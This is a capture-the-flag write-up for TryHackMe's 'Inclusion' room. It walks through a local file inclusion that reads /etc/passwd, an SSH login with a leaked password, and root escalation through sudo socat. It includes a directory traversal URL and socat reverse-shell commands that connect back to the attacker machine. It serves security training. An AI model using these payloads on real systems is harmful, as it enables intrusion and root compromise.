# Inclusion writeup
[Link to the CTF on TryHackMe](https://tryhackme.com/room/inclusion)

# Information about the CTF
> A beginner level LFI challenge

Attacker IP = 10.10.38.168
Target IP = 10.10.141.135  
Machine Type = AttackBox

# How to solve it
## Task 1) user flag
Start by entering the target IP inside your browser

Now click around the buttons and watch the url.  
`http://10.10.141.135/article?name=hacking`

Seems like it could be vulnerable to a LFI attack.

> LFI vulnerability = An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server

Lets try a simple directory traversal to find the `/etc/passwd`
```url
http://10.10.141.135/article?name=../../../../etc/passwd
```

This will show the contents of the `/etc/passwd` directory. Since this output is very cluttered, let's use CyberChef to make it look better.

Click [here](https://gchq.github.io/CyberChef/#recipe=Split('%20','%5C%5Cn')) for my recipe, and then paste the contents from the `/etc/passwd`

By a quick look, we can see a password is commented out:  
`#falconfeast:<Find_this>`

The password will be shown inside the `<Find_this>` 

Now try to SSH into the target machine using the name and password
```console
berkankutuk@thm:~$ ssh falconfeast@10.10.141.135
```

Aaand we are in! :D

Let's check what we have by running `ls`  
```console
falconfeast@inclusion:~$ ls
articles  user.txt
```
Ah, the user.txt file! Let's see the contents of it.
```console
falconfeast@inclusion:~$ cat user.txt
...
```

This should give you the user flag!

## Task 2) root flag
Now to the good part, privilege escalation!

Lets try running the `sudo -l` command.

`-l` = this option will list the allowed (and forbidden) commands for the invoking user

```console
falconfeast@inclusion:~$ sudo -l

Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

As we can see in the output, falconfeast might be able to run the `/usr/bin/socat` as the root. Lets see how we can make use of this to elevate our priviliges. 

For this, i'll search for 'socat' in [GTFOBins](https://gtfobins.github.io/gtfobins/socat/) which contains a list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

GTFOBins gave me some options, but we will be usint the "Reverse Shell" one.

Start by entering this command inside a terminal in your attacker machine  
```socat file:`tty`,raw,echo=0 tcp-listen:12345 ```

Now enter the following command inside the terminal for the target machine.  
```socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane```  
Which in our case will be  
```sudo socat tcp-connect:10.10.38.168:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane```

Go back to your attacker machine to see the magic :D
```console
root@ip-10-10-38-168:~# socat file:`tty`,raw,echo=0 tcp-listen:12345
/bin/sh: 0: can't access tty; job control turned off
# 
```

Lets check who we are!
```console
# $ whoami
root
```
Beautiful! 

Lets move to the `/root` directory and see its contents
```console
# $ cd /root | ls
root.txt
```

We have the root.txt file! Lets open it
```console
root:~$ cat root.txt
...
```

Congratulations, you now have the root flag. :)